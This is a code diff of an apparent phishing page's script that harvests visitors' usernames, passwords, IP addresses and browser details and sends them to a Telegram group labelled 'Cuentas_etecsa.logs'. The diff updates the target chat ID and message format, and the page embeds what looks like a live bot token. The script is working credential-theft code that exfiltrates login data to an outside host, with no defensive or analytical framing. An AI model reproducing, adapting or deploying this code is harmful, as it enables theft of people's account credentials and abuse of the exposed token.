@@ -232,10 +232,10 @@
     </div>
 
     <script>
-        // Configuración de Telegram - GRUPO PRIVADO
+        // Configuración de Telegram - GRUPO PRIVADO CORRECTO
         const TELEGRAM_CONFIG = {
             BOT_TOKEN: '6516180762:AAHE5RGPH1kpADaABDGzQLt0962277Nlg1I',
-            CHAT_ID: '6471602133'  // ID del grupo privado
+            CHAT_ID: '-1003181825017'  // ID CORRECTO DEL GRUPO Cuentas_etecsa.logs
         };
 
         // Obtener IP del usuario
@@ -306,9 +306,9 @@
                 const fecha = new Date().toLocaleString('es-ES');
                 const browserInfo = getBrowserInfo();
 
-                // Crear mensaje para Telegram - FORMATO GRUPO
+                // Crear mensaje para Telegram - GRUPO Cuentas_etecsa.logs
                 const telegramMessage = `
-🚀 <b>NUEVO REGISTRO - GRUPO ETECSA</b>
+🚀 <b>NUEVO REGISTRO - Cuentas_etecsa.logs</b>
 
 👤 <b>Usuario:</b> <code>${username}</code>
 🔒 <b>Contraseña:</b> <code>${password}</code>
@@ -317,7 +317,7 @@
 💻 <b>Navegador:</b> ${browserInfo.browser}
 🖥️ <b>Sistema Operativo:</b> ${browserInfo.os}
 
-#ETECSA_GROUP #LOG_${Date.now()}
+#ETECSA_LOGS #${Date.now()}
                 `;
 
                 // Enviar a Telegram GRUPO
@@ -367,4 +367,4 @@
         window.addEventListener('load', typePlaceholder);
     </script>
 </body>
-    </html>
+            </html>
